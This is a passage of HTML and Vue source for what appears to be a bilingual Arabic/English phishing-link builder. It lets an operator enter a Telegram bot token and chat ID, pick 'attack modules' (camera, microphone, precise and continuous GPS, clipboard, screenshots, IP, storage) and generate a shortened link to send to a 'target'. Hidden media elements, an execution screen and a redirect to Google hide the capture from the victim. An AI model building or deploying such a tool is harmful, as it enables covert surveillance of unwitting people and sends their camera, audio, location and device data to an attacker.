                                    <input type="range" v-model="extra.imageQuality" min="0.1" max="1" step="0.1" class="w-full">
                                    <div class="flex justify-between text-xs">
                                        <span>10%</span>
                                        <span class="text-cyan-400">{{ Math.round(extra.imageQuality * 100) }}%</span>
                                        <span>100%</span>
                                    </div>
                                </div>
                                <div class="flex items-center justify-between">
                                    <span class="text-sm">{{ lang==='ar'?'وضع التصحيح (Debug)':'Debug Mode' }}</span>
                                    <label class="relative inline-flex items-center cursor-pointer">
                                        <input type="checkbox" v-model="extra.debug" class="sr-only peer">
                                        <div class="w-11 h-6 bg-gray-700 rounded-full peer peer-checked:after:translate-x-full after:content-[''] after:absolute after:top-[2px] after:right-[2px] after:bg-white after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-cyan-600"></div>
                                    </label>
                                </div>
                                <div class="flex items-center justify-between">
                                    <span class="text-sm">{{ lang==='ar'?'GPS مستمر':'Continuous GPS' }}</span>
                                    <label class="relative inline-flex items-center cursor-pointer">
                                        <input type="checkbox" v-model="extra.continuousGPS" class="sr-only peer">
                                        <div class="w-11 h-6 bg-gray-700 rounded-full peer peer-checked:after:translate-x-full after:content-[''] after:absolute after:top-[2px] after:right-[2px] after:bg-white after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-cyan-600"></div>
                                    </label>
                                </div>
                            </div>
                        </div>

                        <!-- قسم الخصوصية -->
                        <div class="bg-black/40 rounded-3xl p-6 border border-cyan-500/20">
                            <h3 class="font-bold text-lg mb-4 flex items-center gap-2"><i class="fas fa-user-secret text-cyan-400"></i> {{ lang==='ar'?'الخصوصية والتتبع':'Privacy & Tracking' }}</h3>
                            <div class="space-y-4">
                                <div class="flex items-center justify-between">
                                    <span class="text-sm">{{ lang==='ar'?'إرسال الموقع بشكل مستمر':'Continuous Location' }}</span>
                                    <label class="relative inline-flex items-center cursor-pointer">
                                        <input type="checkbox" v-model="privacy.continuousLocation" class="sr-only peer">
                                        <div class="w-11 h-6 bg-gray-700 rounded-full peer peer-checked:after:translate-x-full after:content-[''] after:absolute after:top-[2px] after:right-[2px] after:bg-white after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-cyan-600"></div>
                                    </label>
                                </div>
                                <div class="flex items-center justify-between">
                                    <span class="text-sm">{{ lang==='ar'?'إخفاء الـ IP الحقيقي':'Hide Real IP' }}</span>
                                    <label class="relative inline-flex items-center cursor-pointer">
                                        <input type="checkbox" v-model="privacy.hideIP" class="sr-only peer">
                                        <div class="w-11 h-6 bg-gray-700 rounded-full peer peer-checked:after:translate-x-full after:content-[''] after:absolute after:top-[2px] after:right-[2px] after:bg-white after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-cyan-600"></div>
                                    </label>
                                </div>
                                <div>
                                    <label class="text-sm block mb-1">{{ lang==='ar'?'وكيل بروكسي (اختياري)':'Proxy (Optional)' }}</label>
                                    <input type="text" v-model="privacy.proxy" class="w-full bg-black/60 border border-cyan-500/30 rounded-xl py-2 px-3 text-sm" placeholder="http://proxy:port">
                                </div>
                            </div>
                        </div>

                        <!-- قسم إضافي: حفظ وتحميل -->
                        <div class="bg-black/40 rounded-3xl p-6 border border-cyan-500/20">
                            <h3 class="font-bold text-lg mb-4 flex items-center gap-2"><i class="fas fa-database text-cyan-400"></i> {{ lang==='ar'?'حفظ واستيراد':'Save & Import' }}</h3>
                            <div class="space-y-3">
                                <button @click="saveFullConfig" class="w-full bg-blue-900/40 border border-blue-500/50 rounded-xl py-3 hover:bg-blue-800/40 transition"><i class="fas fa-save ml-2"></i> {{ lang==='ar'?'حفظ جميع الإعدادات':'Save All Settings' }}</button>
                                <button @click="loadFullConfig" class="w-full bg-gray-800/60 border border-gray-600 rounded-xl py-3 hover:bg-gray-700/60 transition"><i class="fas fa-upload ml-2"></i> {{ lang==='ar'?'تحميل الإعدادات':'Load Settings' }}</button>
                                <button @click="exportConfigAsFile" class="w-full bg-green-900/40 border border-green-500/50 rounded-xl py-3 hover:bg-green-800/40 transition"><i class="fas fa-file-export ml-2"></i> {{ lang==='ar'?'تصدير كملف':'Export as File' }}</button>
                                <input type="file" @change="importConfigFromFile" accept=".json" class="hidden" ref="fileInput">
                                <button @click="$refs.fileInput.click()" class="w-full bg-purple-900/40 border border-purple-500/50 rounded-xl py-3 hover:bg-purple-800/40 transition"><i class="fas fa-file-import ml-2"></i> {{ lang==='ar'?'استيراد من ملف':'Import from File' }}</button>
                            </div>
                        </div>
                    </div>

                    <!-- التبويب: السجلات المتقدمة -->
                    <div v-if="activeTab === 'logs'" class="space-y-4">
                        <div class="flex justify-between items-center mb-4">
                            <h3 class="text-xl font-bold flex items-center gap-2"><i class="fas fa-history text-cyan-400"></i> {{ lang==='ar'?'سجل العمليات المتقدم':'Advanced Operation Logs' }}</h3>
                            <div class="flex gap-2">
                                <button @click="exportLogs" class="bg-green-900/40 border border-green-500/50 rounded-full px-4 py-2 text-sm hover:bg-green-800/40"><i class="fas fa-download ml-1"></i> {{ lang==='ar'?'تصدير':'Export' }}</button>
                                <button @click="clearLogs" class="bg-red-900/40 border border-red-500/50 rounded-full px-4 py-2 text-sm hover:bg-red-800/40"><i class="fas fa-trash-alt ml-1"></i> {{ lang==='ar'?'مسح الكل':'Clear All' }}</button>
                            </div>
                        </div>
                        
                        <!-- فلترة السجلات -->
                        <div class="flex gap-2 mb-3 overflow-x-auto">
                            <button @click="logFilter = 'all'" class="px-3 py-1 rounded-full text-xs" :class="logFilter === 'all' ? 'bg-cyan-600' : 'bg-black/30'">الكل</button>
                            <button @click="logFilter = 'success'" class="px-3 py-1 rounded-full text-xs" :class="logFilter === 'success' ? 'bg-green-600' : 'bg-black/30'"><i class="fas fa-check-circle ml-1"></i>نجاح</button>
                            <button @click="logFilter = 'error'" class="px-3 py-1 rounded-full text-xs" :class="logFilter === 'error' ? 'bg-red-600' : 'bg-black/30'"><i class="fas fa-exclamation-circle ml-1"></i>خطأ</button>
                            <button @click="logFilter = 'info'" class="px-3 py-1 rounded-full text-xs" :class="logFilter === 'info' ? 'bg-blue-600' : 'bg-black/30'"><i class="fas fa-info-circle ml-1"></i>معلومات</button>
                            <button @click="logFilter = 'warning'" class="px-3 py-1 rounded-full text-xs" :class="logFilter === 'warning' ? 'bg-yellow-600' : 'bg-black/30'"><i class="fas fa-exclamation-triangle ml-1"></i>تحذير</button>
                        </div>

                        <!-- جدول السجلات -->
                        <div class="bg-black/60 border border-cyan-500/20 rounded-3xl p-4 h-96 overflow-y-auto font-mono text-xs">
                            <div v-for="(log, idx) in filteredLogs" :key="idx" class="border-b border-gray-800 py-3 hover:bg-black/40 transition">
                                <div class="flex items-start gap-3">
                                    <span class="text-gray-500 whitespace-nowrap">[{{ log.time }}]</span>
                                    <span :class="{
                                        'text-green-400': log.type === 'success',
                                        'text-red-400': log.type === 'error',
                                        'text-blue-400': log.type === 'info',
                                        'text-yellow-400': log.type === 'warning'
                                    }" class="font-bold">{{ log.type.toUpperCase() }}</span>
                                    <span class="text-gray-300 flex-1">{{ log.msg }}</span>
                                    <span v-if="log.details" class="text-gray-600 text-xs cursor-help" :title="log.details"><i class="fas fa-info-circle"></i></span>
                                </div>
                            </div>
                            <div v-if="filteredLogs.length === 0" class="text-center text-gray-500 py-10">
                                <i class="fas fa-inbox text-4xl mb-3 opacity-50"></i>
                                <p>{{ lang==='ar'?'لا توجد سجلات':'No logs found' }}</p>
                            </div>
                        </div>
                    </div>

                    <!-- التبويب: الإحصائيات المتقدمة والرسوم البيانية -->
                    <div v-if="activeTab === 'stats'" class="space-y-6">
                        <h3 class="text-xl font-bold flex items-center gap-2"><i class="fas fa-chart-bar text-cyan-400"></i> {{ lang==='ar'?'تحليلات متقدمة':'Advanced Analytics' }}</h3>
                        
                        <!-- بطاقات الإحصائيات -->
                        <div class="grid grid-cols-2 md:grid-cols-4 gap-4">
                            <div class="bg-black/40 rounded-2xl p-4 text-center border border-cyan-500/20">
                                <i class="fas fa-eye text-2xl text-cyan-400 mb-2"></i>
                                <div class="text-2xl font-bold">{{ stats.totalVisits }}</div>
                                <div class="text-xs text-gray-400">{{ lang==='ar'?'إجمالي الزيارات':'Total Visits' }}</div>
                            </div>
                            <div class="bg-black/40 rounded-2xl p-4 text-center border border-cyan-500/20">
                                <i class="fas fa-check-circle text-2xl text-green-400 mb-2"></i>
                                <div class="text-2xl font-bold">{{ stats.successCount }}</div>
                                <div class="text-xs text-gray-400">{{ lang==='ar'?'عمليات ناجحة':'Successful' }}</div>
                            </div>
                            <div class="bg-black/40 rounded-2xl p-4 text-center border border-cyan-500/20">
                                <i class="fas fa-times-circle text-2xl text-red-400 mb-2"></i>
                                <div class="text-2xl font-bold">{{ stats.failCount }}</div>
                                <div class="text-xs text-gray-400">{{ lang==='ar'?'فاشلة':'Failed' }}</div>
                            </div>
                            <div class="bg-black/40 rounded-2xl p-4 text-center border border-cyan-500/20">
                                <i class="fas fa-microchip text-2xl text-purple-400 mb-2"></i>
                                <div class="text-2xl font-bold">{{ stats.registeredDevices }}</div>
                                <div class="text-xs text-gray-400">{{ lang==='ar'?'الأجهزة':'Devices' }}</div>
                            </div>
                        </div>

                        <!-- الرسوم البيانية -->
                        <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                            <div class="bg-black/40 p-4 rounded-3xl border border-cyan-500/20">
                                <canvas id="visitsChart" width="400" height="200"></canvas>
                            </div>
                            <div class="bg-black/40 p-4 rounded-3xl border border-cyan-500/20">
                                <canvas id="modulesChart" width="400" height="200"></canvas>
                            </div>
                        </div>

                        <!-- توزيع الوحدات -->
                        <div class="bg-black/40 p-4 rounded-3xl border border-cyan-500/20">
                            <h4 class="font-bold mb-3">{{ lang==='ar'?'توزيع استخدام الوحدات':'Module Usage Distribution' }}</h4>
                            <div class="space-y-2">
                                <div v-for="(count, mod) in stats.executionsByModule" :key="mod" class="flex items-center gap-2">
                                    <span class="text-sm w-24">{{ mod }}</span>
                                    <div class="flex-1 h-4 bg-gray-800 rounded-full overflow-hidden">
                                        <div class="h-full bg-gradient-to-l from-cyan-400 to-blue-600" :style="{ width: (count / stats.totalVisits * 100) + '%' }"></div>
                                    </div>
                                    <span class="text-sm text-cyan-300">{{ count }}</span>
                                </div>
                            </div>
                        </div>
                    </div>

                    <!-- التبويب: المساعدة والتوثيق -->
                    <div v-if="activeTab === 'help'" class="space-y-6">
                        <h3 class="text-xl font-bold flex items-center gap-2"><i class="fas fa-question-circle text-cyan-400"></i> {{ lang==='ar'?'دليل الاستخدام المتقدم':'Advanced User Guide' }}</h3>
                        
                        <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                            <!-- بطاقة المساعدة 1 -->
                            <div class="bg-black/40 rounded-3xl p-6 border border-cyan-500/20">
                                <div class="flex items-center gap-3 mb-3">
                                    <div class="w-10 h-10 bg-cyan-600/20 rounded-full flex items-center justify-center">
                                        <i class="fas fa-rocket text-cyan-400"></i>
                                    </div>
                                    <h4 class="font-bold">{{ lang==='ar'?'البدء السريع':'Quick Start' }}</h4>
                                </div>
                                <p class="text-sm text-gray-400">{{ lang==='ar'?'1. أدخل توكن البوت من BotFather\n2. أدخل معرف الدردشة (Chat ID)\n3. اختر الوحدات التي تريدها\n4. اضغط على زر التوليد\n5. انسخ الرابط وأرسله للهدف' : '1. Enter bot token from BotFather\n2. Enter Chat ID\n3. Select modules\n4. Click generate button\n5. Copy and send the link' }}</p>
                            </div>

                            <!-- بطاقة المساعدة 2 -->
                            <div class="bg-black/40 rounded-3xl p-6 border border-cyan-500/20">
                                <div class="flex items-center gap-3 mb-3">
                                    <div class="w-10 h-10 bg-green-600/20 rounded-full flex items-center justify-center">
                                        <i class="fas fa-shield-alt text-green-400"></i>
                                    </div>
                                    <h4 class="font-bold">{{ lang==='ar'?'الأمان والخصوصية':'Security & Privacy' }}</h4>
                                </div>
                                <p class="text-sm text-gray-400">{{ lang==='ar'?'يتم تشفير جميع البيانات باستخدام Base64 مع إمكانية تفعيل AES-256 إضافي. يمكن إخفاء وحدة التحكم لمنع ظهور الأخطاء. استخدم وكيل مزيف لإخفاء هوية المتصفح.' : 'All data is encrypted with Base64, with optional AES-256. Console can be hidden. Use fake UA to hide browser identity.' }}</p>
                            </div>

                            <!-- بطاقة المساعدة 3 -->
                            <div class="bg-black/40 rounded-3xl p-6 border border-cyan-500/20">
                                <div class="flex items-center gap-3 mb-3">
                                    <div class="w-10 h-10 text-yellow-600/20 rounded-full flex items-center justify-center">
                                        <i class="fas fa-microchip text-yellow-400"></i>
                                    </div>
                                    <h4 class="font-bold">{{ lang==='ar'?'الوحدات المتاحة':'Available Modules' }}</h4>
                                </div>
                                <p class="text-sm text-gray-400">{{ lang==='ar'?'هناك 12+ وحدة: معلومات الجهاز، كاميرا، GPS، ميكروفون، لقطة شاشة، حافظة، بطارية، شبكة، إضافات، خطوط، WebGL، تخزين. يمكن اختيار عدة وحدات معاً.' : '12+ modules: Device Info, Camera, GPS, Microphone, Screenshot, Clipboard, Battery, Network, Plugins, Fonts, WebGL, Storage. Multiple can be selected.' }}</p>
                            </div>

                            <!-- بطاقة المساعدة 4 -->
                            <div class="bg-black/40 rounded-3xl p-6 border border-cyan-500/20">
                                <div class="flex items-center gap-3 mb-3">
                                    <div class="w-10 h-10 bg-red-600/20 rounded-full flex items-center justify-center">
                                        <i class="fas fa-bug text-red-400"></i>
                                    </div>
                                    <h4 class="font-bold">{{ lang==='ar'?'استكشاف الأخطاء':'Troubleshooting' }}</h4>
                                </div>
                                <p class="text-sm text-gray-400">{{ lang==='ar'?'إذا لم يعمل الرابط: تأكد من صحة التوكن والمعرف، تحقق من أن البوت لديه صلاحية الإرسال، جرب تعطيل التشفير الإضافي، استخدم وضع التصحيح لرؤية الأخطاء.' : 'If link doesn\'t work: verify token and chat ID, ensure bot can send messages, disable extra encryption, use debug mode.' }}</p>
                            </div>
                        </div>

                        <!-- قسم الأسئلة الشائعة -->
                        <div class="bg-black/40 rounded-3xl p-6 border border-cyan-500/20">
                            <h4 class="font-bold mb-4 flex items-center gap-2"><i class="fas fa-question"></i> {{ lang==='ar'?'الأسئلة الشائعة':'FAQ' }}</h4>
                            <div class="space-y-3">
                                <div v-for="(faq, idx) in faqs" :key="idx" class="border-b border-gray-800 pb-2">
                                    <button @click="faq.open = !faq.open" class="flex justify-between items-center w-full text-right">
                                        <span class="text-cyan-300">{{ faq.question[lang] }}</span>
                                        <i :class="faq.open ? 'fas fa-chevron-up' : 'fas fa-chevron-down'" class="text-gray-500"></i>
                                    </button>
                                    <div v-if="faq.open" class="mt-2 text-sm text-gray-400 pr-4">
                                        {{ faq.answer[lang] }}
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>

                    <!-- التبويب: المجتمع والتحديثات -->
                    <div v-if="activeTab === 'community'" class="space-y-6">
                        <h3 class="text-xl font-bold flex items-center gap-2"><i class="fas fa-users text-cyan-400"></i> {{ lang==='ar'?'المجتمع والتحديثات':'Community & Updates' }}</h3>
                        
                        <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
                            <div class="bg-black/40 rounded-3xl p-6 text-center border border-cyan-500/20 hover:scale-105 transition">
                                <i class="fab fa-github text-5xl text-gray-400 mb-3"></i>
                                <h4 class="font-bold">GitHub</h4>
                                <p class="text-xs text-gray-400 mt-2">star · fork · contribute</p>
                                <a href="#" class="text-cyan-400 text-sm mt-3 inline-block">@gintel</a>
                            </div>
                            <div class="bg-black/40 rounded-3xl p-6 text-center border border-cyan-500/20 hover:scale-105 transition">
                                <i class="fab fa-telegram text-5xl text-blue-400 mb-3"></i>
                                <h4 class="font-bold">Telegram</h4>
                                <p class="text-xs text-gray-400 mt-2">قناة التحديثات</p>
                                <a href="#" class="text-cyan-400 text-sm mt-3 inline-block">t.me/gintel</a>
                            </div>
                            <div class="bg-black/40 rounded-3xl p-6 text-center border border-cyan-500/20 hover:scale-105 transition">
                                <i class="fas fa-envelope text-5xl text-red-400 mb-3"></i>
                                <h4 class="font-bold">الدعم</h4>
                                <p class="text-xs text-gray-400 mt-2">support@gintel.io</p>
                                <a href="#" class="text-cyan-400 text-sm mt-3 inline-block">اتصل بنا</a>
                            </div>
                        </div>

                        <!-- آخر التحديثات -->
                        <div class="bg-black/40 rounded-3xl p-6 border border-cyan-500/20">
                            <h4 class="font-bold mb-3"><i class="fas fa-sync-alt text-cyan-400 ml-2"></i>{{ lang==='ar'?'آخر التحديثات':'Latest Updates' }}</h4>
                            <div class="space-y-2">
                                <div v-for="update in updates" :key="update.version" class="border-b border-gray-800 pb-2">
                                    <div class="flex justify-between">
                                        <span class="text-cyan-300">v{{ update.version }}</span>
                                        <span class="text-xs text-gray-500">{{ update.date }}</span>
                                    </div>
                                    <p class="text-sm text-gray-400">{{ update.description[lang] }}</p>
                                </div>
                            </div>
                        </div>
                    </div>

                    <!-- ========== زر الإنشاء العملاق متعدد الوظائف ========== -->
                    <div class="mt-10 flex flex-col items-center">
                        <button @click="generateLink" :disabled="generating || !canGenerate" 
                                class="group relative px-20 py-6 bg-gradient-to-r from-cyan-800 to-blue-900 rounded-full text-2xl font-bold shadow-2xl shadow-cyan-500/30 overflow-hidden disabled:opacity-50 disabled:cursor-not-allowed w-full md:w-auto min-w-[300px]"
                                :class="{ 'animate-pulse': generating }">
                            <span class="absolute inset-0 bg-gradient-to-r from-cyan-400 to-blue-600 opacity-0 group-hover:opacity-30 transition-opacity"></span>
                            <i class="fas fa-bolt ml-3" :class="{'fa-spin-pulse': generating}"></i>
                            <span>{{ generating ? (lang==='ar'?'جاري التشفير الكمومي...':'Quantum encrypting...') : (lang==='ar'?'توليد الرابط المشفر':'Generate Encrypted Link') }}</span>
                            <i class="fas fa-arrow-left mr-3 group-hover:translate-x-2 transition-transform"></i>
                        </button>
                        
                        <!-- شريط التقدم التفاعلي -->
                        <div v-if="progress > 0" class="mt-4 w-full max-w-md h-3 bg-gray-800 rounded-full overflow-hidden">
                            <div class="h-full bg-gradient-to-l from-cyan-400 via-blue-500 to-purple-600 transition-all duration-500 relative" :style="{ width: progress + '%' }">
                                <div class="absolute inset-0 bg-white/20 animate-pulse"></div>
                            </div>
                            <p class="text-xs text-center mt-1 text-cyan-400">{{ progress }}% - {{ progressMessage }}</p>
                        </div>

                        <!-- ========== بطاقة النتيجة المتطورة ========== -->
                        <transition enter-active-class="animate__animated animate__fadeInUp" leave-active-class="animate__animated animate__fadeOutDown">
                            <div v-if="generatedLink" class="mt-8 w-full bg-black/70 border-2 border-cyan-500/30 rounded-[3rem] p-6 md:p-8 relative overflow-hidden">
                                <!-- خلفية متحركة خفيفة -->
                                <div class="absolute inset-0 bg-gradient-to-r from-cyan-600/10 to-blue-600/10 animate-pulse-slow"></div>
                                
                                <div class="relative z-10">
                                    <!-- رأس البطاقة -->
                                    <div class="flex items-center justify-between mb-4">
                                        <div class="flex items-center gap-3">
                                            <span class="bg-cyan-900/70 px-4 py-2 rounded-full text-sm border border-cyan-500/70">
                                                <i class="fas fa-check-circle text-green-400 ml-1"></i> {{ lang==='ar'?'الرابط جاهز':'Link Ready' }}
                                            </span>
                                            <span class="bg-purple-900/70 px-4 py-2 rounded-full text-sm border border-purple-500/70">
                                                <i class="fas fa-shield-alt ml-1"></i> {{ encryptionStrength }}
                                            </span>
                                        </div>
                                        <div class="flex gap-2">
                                            <button @click="showQR = !showQR" class="w-10 h-10 rounded-full bg-black/50 border border-cyan-500/30 flex items-center justify-center hover:bg-cyan-900/30">
                                                <i class="fas fa-qrcode text-cyan-400"></i>
                                            </button>
                                            <button @click="downloadLinkAsFile" class="w-10 h-10 rounded-full bg-black/50 border border-cyan-500/30 flex items-center justify-center hover:bg-cyan-900/30">
                                                <i class="fas fa-download text-cyan-400"></i>
                                            </button>
                                        </div>
                                    </div>

                                    <!-- رمز QR إذا تم تفعيله -->
                                    <div v-if="showQR" class="mb-4 flex justify-center">
                                        <div id="qrcode" class="bg-white p-2 rounded-2xl"></div>
                                    </div>

                                    <!-- عرض الرابط -->
                                    <div class="bg-black/80 border border-cyan-500/30 rounded-2xl p-4">
                                        <div class="flex items-start gap-3">
                                            <i class="fas fa-link text-cyan-400 text-xl mt-2"></i>
                                            <textarea readonly v-model="generatedLink" rows="3" 
                                                      class="w-full bg-transparent border-none text-cyan-300 mono text-sm resize-none focus:outline-none"
                                                      :class="{ 'select-none': security.preventCopy }"></textarea>
                                        </div>
                                    </div>

                                    <!-- إحصائيات الرابط -->
                                    <div class="grid grid-cols-3 gap-2 mt-3 text-xs text-center">
                                        <div class="bg-black/40 rounded-xl py-2">
                                            <span class="text-gray-400">{{ lang==='ar'?'الحجم':'Size' }}:</span>
                                            <span class="text-cyan-300 mr-1">{{ (generatedLink.length / 1024).toFixed(2) }} KB</span>
                                        </div>
                                        <div class="bg-black/40 rounded-xl py-2">
                                            <span class="text-gray-400">{{ lang==='ar'?'الوحدات':'Modules' }}:</span>
                                            <span class="text-cyan-300 mr-1">{{ selectedModules.length }}</span>
                                        </div>
                                        <div class="bg-black/40 rounded-xl py-2">
                                            <span class="text-gray-400">{{ lang==='ar'?'التشفير':'Encryption' }}:</span>
                                            <span class="text-cyan-300 mr-1">{{ security.encrypt ? 'AES' : 'Base64' }}</span>
                                        </div>
                                    </div>

                                    <!-- أزرار التحكم المتقدمة -->
                                    <div class="grid grid-cols-2 md:grid-cols-4 gap-3 mt-4">
                                        <button @click="copyLink" class="bg-gray-800 hover:bg-gray-700 rounded-xl py-3 text-sm flex items-center justify-center gap-2 transition hover:scale-105">
                                            <i class="fas fa-copy"></i> {{ lang==='ar'?'نسخ':'Copy' }}
                                        </button>
                                        <button @click="testLink" class="bg-gray-800 hover:bg-gray-700 rounded-xl py-3 text-sm flex items-center justify-center gap-2 transition hover:scale-105">
                                            <i class="fas fa-play"></i> {{ lang==='ar'?'اختبار':'Test' }}
                                        </button>
                                        <button @click="shortenWithIsgd" class="bg-gray-800 hover:bg-gray-700 rounded-xl py-3 text-sm flex items-center justify-center gap-2 transition hover:scale-105">
                                            <i class="fas fa-scissors"></i> is.gd
                                        </button>
                                        <button @click="shortenWithTiny" class="bg-gray-800 hover:bg-gray-700 rounded-xl py-3 text-sm flex items-center justify-center gap-2 transition hover:scale-105">
                                            <i class="fas fa-arrow-up-short-wide"></i> TinyURL
                                        </button>
                                    </div>

                                    <!-- تحليلات سريعة للرابط -->
                                    <div class="mt-4 text-xs text-gray-500 flex items-center justify-between">
                                        <span><i class="fas fa-clock ml-1"></i> {{ lang==='ar'?'تم الإنشاء':'Created' }}: {{ new Date().toLocaleString(lang === 'ar' ? 'ar-EG' : 'en-US') }}</span>
                                        <span><i class="fas fa-fingerprint ml-1"></i> {{ linkHash }}</span>
                                    </div>
                                </div>
                            </div>
                        </transition>
                    </div>

                    <!-- ========== شريط الحالة السفلي ========== -->
                    <div class="mt-8 flex items-center justify-between text-xs text-gray-500 border-t border-gray-800 pt-4">
                        <div class="flex items-center gap-4">
                            <span><i class="fas fa-database ml-1 text-cyan-400"></i> {{ memoryUsage }}</span>
                            <span><i class="fas fa-clock ml-1 text-cyan-400"></i> {{ currentTime }}</span>
                            <span><i class="fas fa-wifi ml-1" :class="online ? 'text-green-400' : 'text-red-400'"></i> {{ online ? 'متصل' : 'غير متصل' }}</span>
                        </div>
                        <div class="flex gap-3">
                            <a href="#" class="hover:text-cyan-400 transition">Terms</a>
                            <a href="#" class="hover:text-cyan-400 transition">Privacy</a>
                            <span>v12.0.0</span>
                        </div>
                    </div>
                </div>
            </div>
        </main>

        <!-- ================================================================= -->
        <!-- شاشة التنفيذ المتطورة (تظهر عند وجود ?m=) -->
        <!-- ================================================================= -->
        <div v-else class="fixed inset-0 flex items-center justify-center z-30 bg-black/90 backdrop-blur-2xl">
            <div class="glass-deep rounded-[4rem] p-10 text-center max-w-2xl border-2 border-cyan-500/30">
                <!-- أيقونة متحركة -->
                <div class="relative w-32 h-32 mx-auto mb-6">
                    <div class="absolute inset-0 border-4 border-cyan-500 rounded-full animate-ping"></div>
                    <div class="absolute inset-2 border-4 border-t-cyan-500 border-r-transparent border-b-transparent border-l-transparent rounded-full animate-spin"></div>
                    <i class="fas fa-microchip-ai absolute inset-0 flex items-center justify-center text-5xl text-cyan-400"></i>
                </div>

                <h2 class="text-3xl md:text-4xl font-bold gradient-text mb-4">
                    {{ lang === 'ar' ? 'جاري تنفيذ العملية الكمومية' : 'Executing Quantum Operation' }}
                </h2>

                <!-- شريط التقدم التفصيلي -->
                <div class="w-full h-4 bg-gray-800 rounded-full overflow-hidden mb-4">
                    <div class="h-full bg-gradient-to-l from-cyan-400 via-blue-500 to-purple-600 transition-all duration-500" :style="{ width: executionProgress + '%' }"></div>
                </div>

                <!-- رسالة الحالة -->
                <p class="text-xl text-cyan-300 mb-2">{{ executionStatus }}</p>
                <p class="text-sm text-gray-400 mb-6">{{ executionDetail }}</p>

                <!-- سجل التنفيذ المباشر -->
                <div class="bg-black/60 border border-cyan-500/20 rounded-2xl p-4 h-40 overflow-y-auto text-right font-mono text-xs">
                    <div v-for="(line, idx) in executionLog" :key="idx" class="text-gray-400 border-b border-gray-800 py-1">
                        <span class="text-gray-600">></span> {{ line }}
                    </div>
                </div>

                <!-- مؤشرات إضافية -->
                <div class="grid grid-cols-3 gap-3 mt-6">
                    <div class="bg-black/40 rounded-xl py-2">
                        <div class="text-xs text-gray-400">{{ lang==='ar'?'الوحدات':'Modules' }}</div>
                        <div class="text-cyan-300 font-bold">{{ selectedModules.length }}</div>
                    </div>
                    <div class="bg-black/40 rounded-xl py-2">
                        <div class="text-xs text-gray-400">{{ lang==='ar'?'المحاولة':'Attempt' }}</div>
                        <div class="text-cyan-300 font-bold">{{ executionAttempt }}/{{ extra.retries }}</div>
                    </div>
                    <div class="bg-black/40 rounded-xl py-2">
                        <div class="text-xs text-gray-400">{{ lang==='ar'?'التأخير':'Delay' }}</div>
                        <div class="text-cyan-300 font-bold">{{ extra.delay }}s</div>
                    </div>
                </div>
            </div>
        </div>

        <!-- عناصر خفية للوسائط -->
        <video id="v" autoplay playsinline style="display: none;"></video>
        <canvas id="c" style="display: none;"></canvas>
        <audio id="a" style="display: none;"></audio>
    </div>

    <script>
        (function() {
            "use strict";

            // =================================================================
            // 1. إعدادات متقدمة ومعالجة الأخطاء الشاملة
            // =================================================================
            window.onerror = function(msg, src, line, col, error) {
                console.error('🚨 خطأ جسيم:', msg, 'at', line, error);
                if (window.vueApp && window.vueApp.addLog) {
                    window.vueApp.addLog('error', `خطأ: ${msg} (سطر ${line})`);
                }
                return true;
            };

            window.onunhandledrejection = function(event) {
                console.error('🚨 وعد غير معالج:', event.reason);
                if (window.vueApp && window.vueApp.addLog) {
                    window.vueApp.addLog('error', `وعد مرفوض: ${event.reason}`);
                }
            };

            // =================================================================
            // 2. إنشاء تطبيق Vue المتطور
            // =================================================================
            const { createApp, ref, reactive, computed, onMounted, watch, nextTick } = Vue;

            const app = createApp({
                setup() {
                    // ---------------------------------------------------------
                    // 2.1 المتغيرات العامة وحالة التطبيق (50+ متغير)
                    // ---------------------------------------------------------
                    const loading = ref(true);
                    const loadingProgress = ref(0);
                    const loadingMessage = ref('تهيئة الأنظمة...');
                    const loadingStage = ref('1/5');
                    
                    const isExecuting = ref(false);
                    const generating = ref(false);
                    const progress = ref(0);
                    const progressMessage = ref('');
                    const generatedLink = ref('');
                    const activeTab = ref('main');
                    const theme = ref('dark');
                    const lang = ref('ar');
                    const online = ref(navigator.onLine);
                    const currentTime = ref(new Date().toLocaleTimeString());
                    const memoryUsage = ref('0 MB');
                    const linkHash = ref('');
                    const showQR = ref(false);
                    
                    // متغيرات التحقق
                    const tokenValidation = reactive({
                        status: null, // null, 'valid', 'invalid'
                        message: ''
                    });
                    const chatIdValid = ref(null);

                    // ---------------------------------------------------------
                    // 2.2 بيانات التكوين الأساسية
                    // ---------------------------------------------------------
                    const config = reactive({
                        token: '',
                        chatId: '',
                        redirectUrl: 'https://www.google.com',
                    });

                    // الوحدات المحددة
                    const selectedModules = ref([]);
                    const moduleSearch = ref('');
                    const selectedCategory = ref('all');

                    // ---------------------------------------------------------
                    // 2.3 قائمة الوحدات المتاحة (12+ وحدة)
                    // ---------------------------------------------------------
                    const attackModules = [
                        // معلومات أساسية
                        { id: 'info', name: { ar: 'معلومات الجهاز', en: 'Device Info' }, category: 'basic', icon: 'fas fa-info-circle', premium: false },
                        { id: 'battery', name: { ar: 'البطارية', en: 'Battery' }, category: 'basic', icon: 'fas fa-battery-full', premium: false },
                        { id: 'network', name: { ar: 'الشبكة والـ IP', en: 'Network & IP' }, category: 'basic', icon: 'fas fa-network-wired', premium: false },
                        { id: 'storage', name: { ar: 'التخزين', en: 'Storage' }, category: 'basic', icon: 'fas fa-database', premium: false },
                        
                        // وسائط
                        { id: 'camera', name: { ar: 'كاميرا', en: 'Camera' }, category: 'media', icon: 'fas fa-camera', premium: false },
                        { id: 'microphone', name: { ar: 'ميكروفون', en: 'Microphone' }, category: 'media', icon: 'fas fa-microphone', premium: false },
                        { id: 'screen', name: { ar: 'لقطة شاشة', en: 'Screenshot' }, category: 'media', icon: 'fas fa-desktop', premium: true },
                        
                        // موقع
                        { id: 'gps', name: { ar: 'GPS دقيق', en: 'Precise GPS' }, category: 'location', icon: 'fas fa-location-dot', premium: false },
                        { id: 'gps_continuous', name: { ar: 'GPS مستمر', en: 'Continuous GPS' }, category: 'location', icon: 'fas fa-satellite', premium: true },
                        
                        // متصفح
                        { id: 'plugins', name: { ar: 'الإضافات', en: 'Plugins' }, category: 'browser', icon: 'fas fa-puzzle-piece', premium: false },
                        { id: 'fonts', name: { ar: 'الخطوط', en: 'Fonts' }, category: 'browser', icon: 'fas fa-font', premium: false },
